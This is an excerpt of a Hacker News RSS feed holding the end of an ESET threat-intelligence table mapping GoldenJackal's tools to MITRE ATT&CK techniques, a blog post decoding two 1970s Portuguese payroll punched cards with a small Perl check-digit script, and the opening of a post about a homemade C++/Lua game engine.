</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1518">T1518</a>&nbsp;</td>
<td>Software Discovery&nbsp;</td>
<td>GoldenDealer obtains information about installed programs on a compromised system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1082">T1082</a>&nbsp;</td>
<td>System Information Discovery&nbsp;</td>
<td>GoldenDealer obtains various information about the operating system and user accounts on a compromised system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1016/001">T1016.001</a>&nbsp;</td>
<td>System Network Configuration Discovery: Internet Connection Discovery&nbsp;</td>
<td>GoldenDealer can determine whether a computer is connected to the internet.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1135">T1135</a>&nbsp;</td>
<td>Network Share Discovery&nbsp;</td>
<td>GoldenAce checks a list of drive letters that can include network shares.&nbsp;</td>
</tr>
<tr>
<td rowspan="2"><strong>Lateral Movement</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1210">T1210</a>&nbsp;</td>
<td>Exploitation of Remote Services&nbsp;</td>
<td>GoldenHowl can check for a Windows SMB remote code execution vulnerability that can then be exploited for lateral movement.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1091">T1091</a>&nbsp;</td>
<td>Replication Through Removable Media&nbsp;</td>
<td>GoldenDealer copies executables to and from USB drives, to target air-gapped systems. GoldenAce propagates malicious executables via removable drives.&nbsp;</td>
</tr>
<tr>
<td rowspan="6"><strong>Collection</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1560/002">T1560.002</a>&nbsp;</td>
<td>Archive Collected Data: Archive via Library&nbsp;</td>
<td>GoldenRobo and GoldenUsbCopy archive files to be exfiltrated with the ZIP library.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1119">T1119</a>&nbsp;</td>
<td>Automated Collection&nbsp;</td>
<td>GoldenUsbCopy and GoldenUsbGo automatically stage files for later exfiltration, when a new removable drive is detected.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1005">T1005</a>&nbsp;</td>
<td>Data from Local System&nbsp;</td>
<td>Most tools in GoldenJackal’s toolset collect information and files from the local system.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1025">T1025</a>&nbsp;</td>
<td>Data from Removable Media&nbsp;</td>
<td>GoldenUsbCopy and GoldenUsbGo collect interesting files from removable media.&nbsp;<br>GoldenAce can retrieve staged files from a specific directory on a removable drive.&nbsp;<br>GoldenDealer can retrieve information from compromised systems from a specific directory on a removable drive.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1074/001">T1074.001</a>&nbsp;</td>
<td>Data Staged: Local Data Staging&nbsp;</td>
<td>Most tools in GoldenJackal’s toolset stage files locally for other components to process or exfiltrate them.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1114/001">T1114.001</a>&nbsp;</td>
<td>Email Collection: Local Email Collection&nbsp;</td>
<td>GoldenBlacklist and GoldenPyBlacklist process email files that were collected by an unknown component in GoldenJackal’s toolset.&nbsp;</td>
</tr>
<tr>
<td rowspan="5"><strong>Command and Control</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1071/001">T1071.001</a>&nbsp;</td>
<td>Application Layer Protocol: Web Protocols&nbsp;</td>
<td>GoldenDealer and GoldenHowl use HTTPS for communication.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1092">T1092</a>&nbsp;</td>
<td>Communication Through Removable Media&nbsp;</td>
<td>GoldenDealer uses removable media to pass executables to air-gapped systems, and information from those systems back to connected systems.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1132/001">T1132.001</a>&nbsp;</td>
<td>Data Encoding: Standard Encoding&nbsp;</td>
<td>Executable files sent from the C&amp;C server to GoldenDealer are base64 encoded.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1572">T1572</a>&nbsp;</td>
<td>Protocol Tunneling&nbsp;</td>
<td>GoldenHowl can forward messages through an SSH tunnel.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1090/001">T1090.001</a>&nbsp;</td>
<td>Proxy: Internal Proxy&nbsp;</td>
<td>GoldenHowl can act as a proxy, forwarding packets.&nbsp;</td>
</tr>
<tr>
<td rowspan="4"><strong>Exfiltration</strong>&nbsp;</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1041">T1041</a>&nbsp;</td>
<td>Exfiltration Over C2 Channel&nbsp;</td>
<td>GoldenHowl exfiltrates files via the same channel used as its C&amp;C.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1052/001">T1052.001</a>&nbsp;</td>
<td>Exfiltration Over Physical Medium: Exfiltration over USB&nbsp;</td>
<td>GoldenJackal’s toolset provides capabilities to copy files from air-gapped systems and move them to connected systems via USB drives, for exfiltration.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1567/002">T1567.002</a>&nbsp;</td>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage&nbsp;</td>
<td>GoldenDrive exfiltrates files to an attacker-controlled Google Drive account.&nbsp;</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1048/002">T1048.002</a>&nbsp;</td>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol&nbsp;</td>
<td>GoldenMailer exfiltrates files via SMTP, using STARTTLS on port 587.&nbsp;</td>
</tr>
</tbody>
</table>
<p><a href="https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=wls-research&amp;utm_content=mind-air-gap-goldenjackal-gooses-government-guardrails&amp;sfdccampaignid=7011n0000017htTAAQ" target="_blank" rel="noopener"><img src="https://web-assets.esetstatic.com/wls/2023/2023-12/welivesecurity-eset-threat-intelligence.jpeg" alt="" width="915" height="296"></a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Rabbit hole: stumbling across two Portuguese punched cards (138 pts)]]></title>
            <link>https://blog.jgc.org/2024/10/rabbit-hole-stumbling-across-two.html</link>
            <guid>41779576</guid>
            <pubDate>Tue, 08 Oct 2024 17:19:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.jgc.org/2024/10/rabbit-hole-stumbling-across-two.html">https://blog.jgc.org/2024/10/rabbit-hole-stumbling-across-two.html</a>, See on <a href="https://news.ycombinator.com/item?id=41779576">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-1064951669793470512" itemprop="description articleBody">
<p>Look, here's the thing, I don't like mysteries that involve technology. I think I hate them because I know that some other human created the thing I'm staring at and, dammit, I should be able to understand it.&nbsp;</p><p>And, then one day I was browsing in one of those places where people leave books for others to take. I flipped through an old Portuguese book about computers published in the 1970s and two punched cards fell out.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzBivbRxiU1_S2lVCnPEW6QHF5ZZwXoDF7ODp9vST3nLSOd5cLjto0enI9RiFWSi2WE3iey6pNOhn03neYX5j7JsNjCuvTpyak6WxwJXbEAfa2OILkjlQh7aNSJQGjV_iVKzQbuMvmCHBmWFEc0Gqawtgm5suMfq5CESmvSiDFxwjGgX2_7NST9A/s3078/punch-1.jpg" imageanchor="1"><img data-original-height="2840" data-original-width="3078" height="590" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzBivbRxiU1_S2lVCnPEW6QHF5ZZwXoDF7ODp9vST3nLSOd5cLjto0enI9RiFWSi2WE3iey6pNOhn03neYX5j7JsNjCuvTpyak6WxwJXbEAfa2OILkjlQh7aNSJQGjV_iVKzQbuMvmCHBmWFEc0Gqawtgm5suMfq5CESmvSiDFxwjGgX2_7NST9A/w640-h590/punch-1.jpg" width="640"></a></p><p>Nerd. Sniped. By. Gravity.</p><p>One punched card contains the data <span>M000015 JOAO A. FERNANDES 150000190</span> and the other <span>1000015 100170476</span>. OK, so <span>000015</span> is probably some sort of identifier (employee ID?) but the other numbers are a mystery. Could they be Portuguese <a href="https://pt.wikipedia.org/wiki/N%C3%BAmero_de_identifica%C3%A7%C3%A3o_fiscal">tax identification numbers</a> (NIFs)? Those start with 1, 2 or 3 (for individuals) and are nine digits.</p><p>Nope. I wrote some <a href="https://gist.github.com/jgrahamc/ae5b030be5cdffb424d1ae126023190f">code to verify the NIF's</a> check digit and both aren't NIFs.&nbsp;</p><p><span>use strict;<br>use warnings;<br>sub nif_check {<br>&nbsp; &nbsp; my ($nif) = @_;<br>&nbsp; &nbsp; my $check = 0;<br>&nbsp; &nbsp; foreach my $i (reverse 0..7) {<br>&nbsp; &nbsp; &nbsp; &nbsp; $check += substr($nif, $i, 1) * (9-$i);<br>&nbsp; &nbsp; }<br>&nbsp; &nbsp; $check %= 11;<br>&nbsp; &nbsp; if ($check &lt; 2) {<br>&nbsp; &nbsp; &nbsp; &nbsp; $check = 0;<br>&nbsp; &nbsp; } else {<br>&nbsp; &nbsp; &nbsp; &nbsp; $check = 11 - $check;<br>&nbsp; &nbsp; }<p>&nbsp; &nbsp; print "$nif $check\n";<br>}</p><p>nif_check($ARGV[0]);</p></span></p><p><span>$ perl nif.pl 100170476<br>100170476 1<br>$ perl nif.pl 150000190<br>150000190 7</span></p><p>So what's encoded on these cards? And does <span>000015</span> mean they are related?</p><p>I found the answer starting with the fact that these punched cards are custom printed with the letters&nbsp;<b>In Es Me</b> on them. What's In Es Me? It took a while to answer that, but it turns out that In Es Me was a business called "Instituto de Estudos Mecanográficos" based in Lisbon in the late 1960s and early 1970s.&nbsp;</p><p>It appears to have been a school that taught people the exciting new world of computing, which, they claim in their advertisements was "Uma profissão actual e rentavel" (A modern and profitable profession) and also "Uma das profissões de melhor futuro" (One of the professions with a great future).</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8m_FT4M0kIoM5N7QKWv35i1FFYfvugT3Fn9MxknuRbKMdsWnwSneClbVdDCxhbIsTPYicsZmaD-pCLKvjZnxkPNcismZaqlIK7jAGKUsuzg_v2lu1DoclTwScNf0UicI-8EkGgFlr1w-EGVqDr0VZiM0MDEvEyryRHAlUR9LYWqBjqHQZz9E5Dg/s1230/punch-4.jpeg" imageanchor="1"><img data-original-height="666" data-original-width="1230" height="216" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8m_FT4M0kIoM5N7QKWv35i1FFYfvugT3Fn9MxknuRbKMdsWnwSneClbVdDCxhbIsTPYicsZmaD-pCLKvjZnxkPNcismZaqlIK7jAGKUsuzg_v2lu1DoclTwScNf0UicI-8EkGgFlr1w-EGVqDr0VZiM0MDEvEyryRHAlUR9LYWqBjqHQZz9E5Dg/w400-h216/punch-4.jpeg" width="400"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-RLe3aytS2tESLnotW85eYivXA-ox4Ol7kwkzv2XLAJ-XILpuyW_TYMUMvjs7pXmDyeow2DGeVlg-sa_baJiUSDuT1CNcpT8LN6e3SCrk2w3V_nJfABqLpAfe0XKOXK-GzX_veURmCXVEMHmvcpHYanXOamhNfddnJiQ_WskW04gdpsdTNjb27g/s630/punch-3.jpeg" imageanchor="1"><img data-original-height="306" data-original-width="630" height="194" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-RLe3aytS2tESLnotW85eYivXA-ox4Ol7kwkzv2XLAJ-XILpuyW_TYMUMvjs7pXmDyeow2DGeVlg-sa_baJiUSDuT1CNcpT8LN6e3SCrk2w3V_nJfABqLpAfe0XKOXK-GzX_veURmCXVEMHmvcpHYanXOamhNfddnJiQ_WskW04gdpsdTNjb27g/w400-h194/punch-3.jpeg" width="400"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl2CF-LCR2xi5kQWLmm3C_ON-ojZVXu7ZvKPrIqkHYWwR416VTa54HEcwLDopBCQuEumuThhbw3rtv3GOrxcmYf7kfqyRAuOOvtrwnw2RbPqS5l0l5Q8PQZr71QFGvDWhb1F8VjIJTAHbf-BExcjTIUq5IlfSftu_KyrmuXHBHVGZmtgIDSDDbnQ/s852/punch-2.jpeg" imageanchor="1"><img data-original-height="852" data-original-width="766" height="400" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl2CF-LCR2xi5kQWLmm3C_ON-ojZVXu7ZvKPrIqkHYWwR416VTa54HEcwLDopBCQuEumuThhbw3rtv3GOrxcmYf7kfqyRAuOOvtrwnw2RbPqS5l0l5Q8PQZr71QFGvDWhb1F8VjIJTAHbf-BExcjTIUq5IlfSftu_KyrmuXHBHVGZmtgIDSDDbnQ/w360-h400/punch-2.jpeg" width="360"></a></p><p>Great, but apparently no closer to knowing about João&nbsp;A. Fernandes and those numbers. But then I discovered someone selling a book called "Introdução aos Ordenadores" (Introduction to Computers) which was apparently distributed by In Es Me exclusively in Portugal:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXU8N7ORFPdX4xEXGOsz2nYf358cooye4NcrfF6PbzJr_ggkGZ2h7Mtd5E_VIwPKvXuRvuW7SBwEpmma9gqF8z3eU1nPDKTkIG3omQnvA-DugK_x8GcJxHyX650JYeuE3u2Vn8LJD14U8tR0ZABIo6xvwmQDw5kO38xmUTU6mqnSIaqovj2uVMYg/s4032/punch-6.jpg" imageanchor="1"><img data-original-height="4032" data-original-width="3024" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXU8N7ORFPdX4xEXGOsz2nYf358cooye4NcrfF6PbzJr_ggkGZ2h7Mtd5E_VIwPKvXuRvuW7SBwEpmma9gqF8z3eU1nPDKTkIG3omQnvA-DugK_x8GcJxHyX650JYeuE3u2Vn8LJD14U8tR0ZABIo6xvwmQDw5kO38xmUTU6mqnSIaqovj2uVMYg/w480-h640/punch-6.jpg" width="480"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeh-we5W8BMwW8pmeOW94gzR9GEIjQEEMBD-zEKMbzkDCNCZvECrELW8IRNk-jJryVToQWwOLdHcc7CKeQ4QlNPVswhgwfOjXcOTuIWOpqwVcKnW9A3PBUFoGssqGxBinzX6d5K_016e2OgKzs-R3vnI845KgkG24Kz9gtwXvLds9g2flhSrOHKg/s5712/punch-5.jpg" imageanchor="1"><img data-original-height="5712" data-original-width="4284" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeh-we5W8BMwW8pmeOW94gzR9GEIjQEEMBD-zEKMbzkDCNCZvECrELW8IRNk-jJryVToQWwOLdHcc7CKeQ4QlNPVswhgwfOjXcOTuIWOpqwVcKnW9A3PBUFoGssqGxBinzX6d5K_016e2OgKzs-R3vnI845KgkG24Kz9gtwXvLds9g2flhSrOHKg/w480-h640/punch-5.jpg" width="480"></a></p><br><div><p>So, I bought it. And, inside that book on page 1-31, are the very two cards that had fallen from that other book. So, it looks like the cards were examples (perhaps from the training course) drawn from the book.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZrf73Ed4Avxgr_9RV79RNbKvGjSXf-iexlqOcB0bvRQKWyVow3DINJwVX8p3WIplqk73QFV1TMrLOJpqGRpo-YIOFwQUEXgBVcRIUHDNVhcp6xqmOQyWld1pnyxozzflq8_5Xq_kk29yTieFw7_cVBzcFPYPSMfA1xNs5CDvuGXWwSmfQdZlTXQ/s5234/punch-7.jpg" imageanchor="1"><img data-original-height="5234" data-original-width="3691" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZrf73Ed4Avxgr_9RV79RNbKvGjSXf-iexlqOcB0bvRQKWyVow3DINJwVX8p3WIplqk73QFV1TMrLOJpqGRpo-YIOFwQUEXgBVcRIUHDNVhcp6xqmOQyWld1pnyxozzflq8_5Xq_kk29yTieFw7_cVBzcFPYPSMfA1xNs5CDvuGXWwSmfQdZlTXQ/w452-h640/punch-7.jpg" width="452"></a></p><p>The cards in the book are life size:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpwQYe9LvFc7uzX6lW4OzRkqXkx3FpYpWzA0jG7U_VDRpArC2BqnUPx9sPgMlS7ZI3KHVr8WWAO5k78LRL3IULTmJMj8Cs3JwI3Xoo8AeWm1iu_q10YoEspqsiVyfTEDzPGYBegcsziTWZV1_pcgY0aXws_HGtBXKIA6xiF8w3IC_vKBy-7rt-Iw/s4610/punch-8.jpg" imageanchor="1"><img data-original-height="4610" data-original-width="3271" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpwQYe9LvFc7uzX6lW4OzRkqXkx3FpYpWzA0jG7U_VDRpArC2BqnUPx9sPgMlS7ZI3KHVr8WWAO5k78LRL3IULTmJMj8Cs3JwI3Xoo8AeWm1iu_q10YoEspqsiVyfTEDzPGYBegcsziTWZV1_pcgY0aXws_HGtBXKIA6xiF8w3IC_vKBy-7rt-Iw/w454-h640/punch-8.jpg" width="454"></a></p><p>(Can you spot the printing error in the book?)</p><p>The good news is that the previous pages describe the numbers on those cards via the columns.</p><div><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeAG9H-07UPNWYixd240URv8eQejewiZey_vn0iDqgio26o6M6DNssD_X36aX3-sDMH4k4T-92hk4GK6xeQLnGD-6y4W5CKsfEOOEniK9v5SgkEYE-1aA8PKipvjhkWUCf15gIRvMR8yeN_ov6Oac_WDkg9zFo4nv2wSswDhspGL4GZe9gqEgYmA/s5087/punch-9.jpg" imageanchor="1"><img data-original-height="5087" data-original-width="3481" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeAG9H-07UPNWYixd240URv8eQejewiZey_vn0iDqgio26o6M6DNssD_X36aX3-sDMH4k4T-92hk4GK6xeQLnGD-6y4W5CKsfEOOEniK9v5SgkEYE-1aA8PKipvjhkWUCf15gIRvMR8yeN_ov6Oac_WDkg9zFo4nv2wSswDhspGL4GZe9gqEgYmA/w438-h640/punch-9.jpg" width="438"></a></p><p>Card code: column 1 (1)</p><p>Employee number: columns 2 to 7</p><p>Payment period: columns 33 to 38</p><p>Total hours worked: columns: 39 to 41</p><br></div><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXAtxo9_Q37ToY1oobyRHIX2jjCdb998xwA-ps-vH9efs6haiEfeV3H8wwzOfFUNI4zqZQPiNYzm_TGWNbuW-yhbO_q7AXws1XHTWhdKR164stDbyuIo8EXHHc1lHtU5HlCdup4n7sJRpFYPt9dMcme1Ua4-5YY_HY25EXDDgIIENo19pTwiT0eg/s3518/punch-10.jpg" imageanchor="1"><img data-original-height="2792" data-original-width="3518" height="318" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXAtxo9_Q37ToY1oobyRHIX2jjCdb998xwA-ps-vH9efs6haiEfeV3H8wwzOfFUNI4zqZQPiNYzm_TGWNbuW-yhbO_q7AXws1XHTWhdKR164stDbyuIo8EXHHc1lHtU5HlCdup4n7sJRpFYPt9dMcme1Ua4-5YY_HY25EXDDgIIENo19pTwiT0eg/w400-h318/punch-10.jpg" width="400"></a></p><p>For the other card...</p><p>Card code: column 1 (M)</p><p>Employee number: columns 2 to 7</p><p>Name: columns: 8 to 32</p><p>Hourly salary: 42 to 46</p><p>Fixed discounts for the week: columns 47 to 50</p><p>So, <span>000015</span> is the employee number. <span>150000190</span> indicates that João&nbsp;A. Fernandes is paid 15$000 (15 <a href="https://en.wikipedia.org/wiki/Portuguese_escudo">Portuguese escudos</a>) per hour and there's a weekly discount (deductions from the salary) of 0$190. Note that for historical reasons sometimes the escudo is written with a three digit decimal, and because earlier on the book we're introduced to João and his colleagues I know that's the format being used.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd3f_5eQUKrs5eUTIcpV9oLLfcQV5HISZ853B-d9ZPHcfVmcKSDqG2m1VQpOTK2_iCT20XvRZdy96t6rWIuiHI1Ab14g_TdYGnQExe5s4y3cE1sih9ALpZJk58Db9txKhDGETzYclCG-qtjtEymKJwtL5d0UN_xeZ-ESP1XdVqthvDgeCM6WPkVw/s5054/punch15.jpg" imageanchor="1"><img data-original-height="5054" data-original-width="3122" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd3f_5eQUKrs5eUTIcpV9oLLfcQV5HISZ853B-d9ZPHcfVmcKSDqG2m1VQpOTK2_iCT20XvRZdy96t6rWIuiHI1Ab14g_TdYGnQExe5s4y3cE1sih9ALpZJk58Db9txKhDGETzYclCG-qtjtEymKJwtL5d0UN_xeZ-ESP1XdVqthvDgeCM6WPkVw/w396-h640/punch15.jpg" width="396"></a></p><p>The other card is a record of his hours worked for a specific week: <span>100170476</span>. 10-01-70 is January 10, 1970 and indicates the week for which the record is generated. 476 is 47.6 hours of work.</p><p>Mystery solved.</p></div><p>Well, almost, In Es Me didn't write this book. If you look at the title page it was apparently created by "ENIASA" and I've found very little information about who they were. Oh well.</p><p>PS Here's a little taste of what the book contains:</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkoFgmwAZ0StQ5B8q5o4oVbwDKO62Mo_BfRVmk98XxYqqRiR8CEd3bcdczHO6XDKYavK_dVkPwmpnJ0xqY8l-N7mFglDe8ef4FpHTNN7k1AEbLWS1hAdcS_1PyG870QHZ4Sh4e-hAHyBwj0SfyX8R1sEWSKXY_NenosKG0OhYjK0rxsFV05HQH7A/s5712/punch-14.jpeg" imageanchor="1"><img data-original-height="4060" data-original-width="5712" height="454" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkoFgmwAZ0StQ5B8q5o4oVbwDKO62Mo_BfRVmk98XxYqqRiR8CEd3bcdczHO6XDKYavK_dVkPwmpnJ0xqY8l-N7mFglDe8ef4FpHTNN7k1AEbLWS1hAdcS_1PyG870QHZ4Sh4e-hAHyBwj0SfyX8R1sEWSKXY_NenosKG0OhYjK0rxsFV05HQH7A/w640-h454/punch-14.jpeg" width="640"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXjXXPuZ8x2RetLBJskjkTdl0kn8smvcv5q30loiD3FzodXI9LgyyW8XWpMzg5bEITMvA0BnvJhyphenhyphenpUHQ3_Dm-eqaLyQJRuYBAXlXz-1FR0W78-cCuFePlr_bCIgjjamIKiSOyOoBAnS_9ONEV1sw_uiEgeNChzpe61BLKqvZzW6E8nD4zOE-wudg/s5712/punch-13.jpeg" imageanchor="1"><img data-original-height="4183" data-original-width="5712" height="468" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXjXXPuZ8x2RetLBJskjkTdl0kn8smvcv5q30loiD3FzodXI9LgyyW8XWpMzg5bEITMvA0BnvJhyphenhyphenpUHQ3_Dm-eqaLyQJRuYBAXlXz-1FR0W78-cCuFePlr_bCIgjjamIKiSOyOoBAnS_9ONEV1sw_uiEgeNChzpe61BLKqvZzW6E8nD4zOE-wudg/w640-h468/punch-13.jpeg" width="640"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhac3KjmhSkfSNrG1zG26FdtdPC26UcGnF87JY5UTbSSwtxGUhHcVpQqvNWpKFMnTlDdVDlnjBdEsfeMCiQHN55tM8V0z9X6p8LrXXOmaKTDu05PHfbIL-ICVEIUji3L6YSOQkYRjburNah_ccyj-dSnCKS0_PxGWw_6B_fIOb7G1l0R8m5fCn7IA/s5712/punch-12.jpeg" imageanchor="1"><img data-original-height="4284" data-original-width="5712" height="480" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhac3KjmhSkfSNrG1zG26FdtdPC26UcGnF87JY5UTbSSwtxGUhHcVpQqvNWpKFMnTlDdVDlnjBdEsfeMCiQHN55tM8V0z9X6p8LrXXOmaKTDu05PHfbIL-ICVEIUji3L6YSOQkYRjburNah_ccyj-dSnCKS0_PxGWw_6B_fIOb7G1l0R8m5fCn7IA/w640-h480/punch-12.jpeg" width="640"></a></p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEik6-BEDP69FxkQKRGFglUbF9hlkKOkZhWY-y0J89-hzohN7iJ5tOWJgPJ7sCp6KmMg4vtTOwUwXemxPM07Tiea4PizR8vIeDdYf2D_35dFmN-RauE2LP8NcNyn-kFeedi9B1H27gVeHt5zL0TTLQJvF1Q6_knCcUjyWGJtnssAztUGS09GnEeDZQ/s5712/punch-11.jpeg" imageanchor="1"><img data-original-height="4284" data-original-width="5712" height="480" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEik6-BEDP69FxkQKRGFglUbF9hlkKOkZhWY-y0J89-hzohN7iJ5tOWJgPJ7sCp6KmMg4vtTOwUwXemxPM07Tiea4PizR8vIeDdYf2D_35dFmN-RauE2LP8NcNyn-kFeedi9B1H27gVeHt5zL0TTLQJvF1Q6_knCcUjyWGJtnssAztUGS09GnEeDZQ/w640-h480/punch-11.jpeg" width="640"></a></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[My first game with Carimbo, my homemade engine (236 pts)]]></title>
            <link>https://nullonerror.org/2024/10/08/my-first-game-with-carimbo/</link>
            <guid>41779519</guid>
            <pubDate>Tue, 08 Oct 2024 17:13:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nullonerror.org/2024/10/08/my-first-game-with-carimbo/">https://nullonerror.org/2024/10/08/my-first-game-with-carimbo/</a>, See on <a href="https://news.ycombinator.com/item?id=41779519">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<header>
<h3>
<a href="https://nullonerror.org/" title="Home">NULL on error</a>
<small>flipping bits whilst updating pixels</small>
</h3>
</header>
<main><article>

<time datetime="2024-10-08T00:00:00+00:00">08 Oct 2024</time>
<p><a href="https://youtu.be/nVRzCstyspQ"><img src="https://img.youtube.com/vi/nVRzCstyspQ/0.jpg" alt="MegaRick Game"></a>
<a href="https://youtu.be/nVRzCstyspQ">https://youtu.be/nVRzCstyspQ</a></p>
<h3 id="tldr">TL;DR</h3>
<p>After a while, I decided to resume work on <a href="https://github.com/carimbolabs/carimbo">my game engine</a>.</p>
<p>I made a game for my son. I could have used an existing engine, but I chose to write everything from scratch because code is like pasta—it’s much better and more enjoyable when homemade.</p>
<p>This actually reminds me of when my father used to build my toys, from kites to wooden slides. Good memories. I have decided to do the same using what I know: programming.</p>
<p>You can watch it here or <a href="https://play.carimbo.cloud/1.0.10/carimbolabs/megarick/1.0.7/720p">play it here</a>, (runs in the browser thanks to WebAssembly), use <code>A</code> and <code>D</code> for moving around and <code>space</code> to shoot.</p>
<p>The engine was written in C++17, and the games are in Lua. The engine exposes some primitives to the Lua VM, which in turn coordinates the entire game.</p>
<p><a href="https://github.com/carimbolabs/megarick">Game source code</a> and <a href="https://github.com/carimbolabs/carimbo">engine source code</a>.</p>
<h3 id="going-deep">Going Deep</h3>
<p>The entire game is scripted in Lua.</p>
<p>First, we create the engine itself.</p>
<div><pre><code><span>local</span> <span>engine</span> <span>=</span> <span>EngineFactory</span><span>.</span><span>new</span><span>()</span>
    <span>:</span><span>set_title</span><span>(</span><span>"Mega Rick"</span><span>)</span>
    <span>:</span><span>set_width</span><span>(</span><span>1920</span><span>)</span>
    <span>:</span><span>set_height</span><span>(</span><span>1080</span><span>)</span>
    <span>:</span><span>set_fullscreen</span><span>(</span><span>false</span><span>)</span>
    <span>:</span><span>create</span><span>()</span>
</code></pre></div>
<p>Then we point to some resources for asset prefetching; they are loaded lazily to avoid impacting the game loop.</p>
<div><pre><code><span>engine</span><span>:</span><span>prefetch</span><span>({</span>
  <span>"blobs/bomb1.ogg"</span><span>,</span>
  <span>"blobs/bomb2.ogg"</span><span>,</span>
  <span>"blobs/bullet.png"</span><span>,</span>
  <span>"blobs/candle.png"</span><span>,</span>
  <span>"blobs/explosion.png"</span><span>,</span>
  <span>"blobs/octopus.png"</span><span>,</span>
  <span>"blobs/player.png"</span><span>,</span>
  <span>"blobs/princess.png"</span><span>,</span>
  <span>"blobs/ship.png"</span>
<span>})</span>
</code></pre></div>
<p>We created the postal service, which is something I borrowed from languages like Erlang, where an entity can send messages to any other. As we’ll see below, the bullet sends a hit message when it collides with the octopus, and the octopus, upon receiving the hit, decrements its own health.</p>
<p>We also obtain the SoundManager to play sounds and spawn the main entities.</p>
<div><pre><code><span>local</span> <span>postal</span> <span>=</span> <span>PostalService</span><span>.</span><span>new</span><span>()</span>
<span>local</span> <span>soundmanager</span> <span>=</span> <span>engine</span><span>:</span><span>soundmanager</span><span>()</span>
<span>local</span> <span>octopus</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"octopus"</span><span>)</span>
<span>local</span> <span>player</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"player"</span><span>)</span>
<span>local</span> <span>princess</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"princess"</span><span>)</span>
<span>local</span> <span>candle1</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"candle"</span><span>)</span>
<span>local</span> <span>candle2</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"candle"</span><span>)</span>
